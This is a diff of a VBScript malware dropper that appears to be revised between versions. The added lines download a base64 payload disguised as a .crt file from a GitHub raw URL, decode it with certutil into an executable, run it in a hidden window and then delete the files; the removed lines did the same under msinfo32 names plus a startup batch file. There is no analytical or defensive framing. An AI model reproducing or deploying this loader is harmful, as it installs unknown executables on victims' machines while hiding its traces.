@@ -1,9 +1,10 @@
-WScript.Sleep(5000)
+WScript.Sleep(20000)
+
 Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
-URL = "https://raw.githubusercontent.com/kaitlyn93/Grandcoffee/main/js/scripts/msinfo32.js"
+URL = "https://raw.githubusercontent.com/kaitlyn93/Grandcoffee/main/js/scripts/write32.js"
 objWinHttp.open "GET", URL, False
 objWinHttp.send ""
-SaveBinaryData "C:\ProgramData\msinfo32\cert64.crt",objWinHttp.responseBody
+SaveBinaryData "C:\Windows\Temp\write32\write32.crt",objWinHttp.responseBody
 Function SaveBinaryData(FileName, Data)
 	Const adTypeText = 1
 	Const adSaveCreateOverWrite = 2
@@ -15,17 +16,21 @@ Function SaveBinaryData(FileName, Data)
 	BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
 End Function
 
-Set objShell = WScript.CreateObject("WScript.Shell")
-objShell.Run "cmd /c powershell certutil -decode C:\ProgramData\msinfo32\cert64.crt C:\ProgramData\msinfo32\msinfo32.exe", 0, True
-WScript.Sleep(3000)
+WScript.Sleep(5000)
 
 Set objShell = WScript.CreateObject("WScript.Shell")
-objShell.Run "cmd /c C:\ProgramData\msinfo32\startup.bat", 0, True
-WScript.Sleep(3000)
+objShell.Run "cmd /c powershell certutil -decode %temp%\write32\write32.crt %temp%\write32\write32.exe; ", 0, True
+
+WScript.Sleep(10000)
 
 Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run chr(34) & "C:\ProgramData\msinfo32\msinfo32.exe" & chr(34), 0
+WshShell.Run chr(34) & "%temp%\write32\write32.exe" & chr(34), 0
 Set WsgShell = Nothing
+
+WScript.Sleep(10000)
+
+Set objShell = WScript.CreateObject("WScript.Shell")
+objShell.Run "cmd /c del /f %temp%\write32\write32.crt && del /f %temp%\write32\wincgi.exe", 0, True
 
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 strScript = Wscript.ScriptFullName
